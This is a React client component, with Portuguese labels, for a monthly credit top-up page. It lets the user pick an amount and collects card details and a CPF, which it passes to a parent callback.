'use client';

import { useState } from 'react';

interface MonthlyPageProps {
    onNext: (data: { amount: string; cardData: Record<string, string> }) => void;
}

export default function MonthlyPage({ onNext }: MonthlyPageProps) {
    const [selectedAmount, setSelectedAmount] = useState('5');
    const [cardNumber, setCardNumber] = useState('');
    const [cvv, setCvv] = useState('');
    const [cardholderName, setCardholderName] = useState('');
    const [month, setMonth] = useState('');
    const [year, setYear] = useState('');
    const [cpf, setCpf] = useState('');

    const amounts = ['5', '10', '20', '30', '40', '50'];

    const handleAdd = () => {
        const cardData = {
            cardNumber,
            cvv,
            cardholderName,
            month,
            year,
            cpf
        };
        onNext({ amount: selectedAmount, cardData });
    };

    return (
        <div className="px-4 py-6">
            {/* Page Title */}
            <h1 className="text-white text-2xl font-bold text-center mb-8 uppercase">
                CRÉDITO MENSALISTA
            </h1>

            {/* Separator */}
            <div className="w-full h-px bg-orange-500 mb-8"></div>

            {/* Amount Selection */}
            <div className="mb-8">
                <p className="text-white text-lg mb-6 text-center">
                    Selecione abaixo quanto será adicionado ao seu crédito mensalmente (Dia: 15):
                </p>

                <div className="grid grid-cols-3 gap-4 mb-8">
                    {amounts.map((amount) => (
                        <button
                            key={amount}
                            onClick={() => setSelectedAmount(amount)}
                            className={`w-full h-16 rounded-full font-bold text-lg transition-colors ${selectedAmount === amount
                                ? 'bg-orange-500 text-white'
                                : 'bg-white text-black hover:bg-gray-200'
                                }`}
                        >
                            R$ {amount}
                        </button>
                    ))}
                </div>
            </div>

            {/* Separator */}
            <div className="w-full h-px bg-orange-500 mb-8"></div>

            {/* Credit Card Form */}
            <div className="space-y-4 mb-8">
                <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    placeholder="Número do cartão"
                    className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                />

                <input
                    type="text"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    placeholder="CVV"
                    className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                />

                <input
                    type="text"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    placeholder="Titular do cartão"
                    className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                />

                <div className="grid grid-cols-2 gap-4">
                    <input
                        type="text"
                        value={month}
                        onChange={(e) => setMonth(e.target.value)}
                        placeholder="MÊS"
                        className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                    />
                    <input
                        type="text"
                        value={year}
                        onChange={(e) => setYear(e.target.value)}
                        placeholder="ANO"
                        className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                    />
                </div>

                <input
                    type="text"
                    value={cpf}
                    onChange={(e) => setCpf(e.target.value)}
                    placeholder="CPF do portador"
                    className="w-full px-4 py-4 bg-gray-800 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-orange-500 text-lg"
                />
            </div>

            {/* Add Button */}
            <button
                onClick={handleAdd}
                className="w-full bg-orange-500 text-white py-4 rounded-lg font-bold text-lg uppercase hover:bg-orange-600 transition-colors mb-4"
            >
                ADICIONAR
            </button>

            {/* Secure Purchase Badge */}
            <div className="flex items-center justify-center space-x-2">
                <svg className="w-6 h-6 text-gray-400" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
                <div className="text-center">
                    <span className="text-gray-400 font-bold uppercase">COMPRA</span>
                    <br />
                    <span className="text-orange-500 font-bold uppercase">SEGURA</span>
                </div>
            </div>
        </div>
    );
}
